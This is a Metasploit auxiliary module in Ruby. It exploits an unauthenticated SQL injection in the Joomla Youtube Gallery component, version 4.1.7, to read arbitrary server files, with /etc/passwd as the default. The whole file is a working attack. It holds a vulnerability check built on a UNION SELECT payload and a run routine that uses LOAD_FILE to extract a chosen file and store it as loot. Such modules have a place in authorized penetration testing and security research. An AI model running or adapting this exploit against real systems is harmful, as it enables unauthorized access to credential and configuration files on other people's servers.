##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'


class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Joomla Youtube Gallery Unauthenticated SQLi Arbitrary File Read',
      'Description'    => %q{
      This module exploits an unauthenticated SQL injection in Joomla Youtube Gallery
      in order to read an arbitrary file from the file system. Tested against version 4.1.7.

      This likely requires a slightly misconfigured database in that the database user must
      have the FILE permissions.
      },
      'License'        => 'ExploitHub',
      'Author'         =>
        [
          'bperry'
        ],
      'References'     =>
        [
          ['URL', 'http://www.exploit-db.com/exploits/34087/']
        ],
      'DisclosureDate' => 'Jul 16 2014'
    ))

    register_options(
      [
        OptString.new('TARGETURI', [ true, "Base Joomla directory path", '/']),
        OptString.new('FILEPATH', [true, 'The file to read from the filesystem', '/etc/passwd'])
      ], self.class)

  end

  def marker
    return Rex::Text.rand_text_alpha(6)
  end

  def send_injected_request(payload)
     get = {
       'option' => 'com_youtubegallery',
       'view' => 'youtubegallery',
       'listid' => '1',
       'themeid' => payload,
       'videoid' => Rex::Text.rand_text_alpha(10),
       'tmpl' => 'component',
       'TB_iframe' => 'true',
       'height' => 500,
       'width' => 700
     }

     return send_request_cgi({
       'uri' => normalize_uri(target_uri.path, 'index.php'),
       'vars_get' => get
     })
  end

  def check
    left_marker = marker
    right_marker = marker

    test = Rex::Text.rand_text_alpha(10)

    payload = "-9524 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x#{left_marker.unpack("H*")[0]},0x#{test.unpack("H*")[0]},0x#{right_marker.unpack("H*")[0]}),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#"

    res = send_injected_request(payload)

    if res and res.body =~ /#{left_marker}(.*)#{right_marker}/ and $1 == test
      return Exploit::CheckCode::Vulnerable
    end

    return Exploit::CheckCode::Safe
  end

  def run
    return unless check == Exploit::CheckCode::Vulnerable

    left_marker = marker
    right_marker = marker

    get_file = "-7268 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x#{left_marker.unpack("H*")[0]},IFNULL(CAST(HEX(LOAD_FILE(0x#{datastore['FILEPATH'].unpack("H*")[0]})) AS CHAR),0x20),0x#{right_marker.unpack("H*")[0]}),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#"

    res = send_injected_request(get_file)

    file = $1 if res and res.body =~ /#{left_marker}(.*)#{right_marker}/

    file = [file].pack("H*")

    path = store_loot("joomla.file", "text/plain", datastore['RHOST'], file, datastore['FILEPATH']) 

    print_good("File saved to: " + path)
  end
end

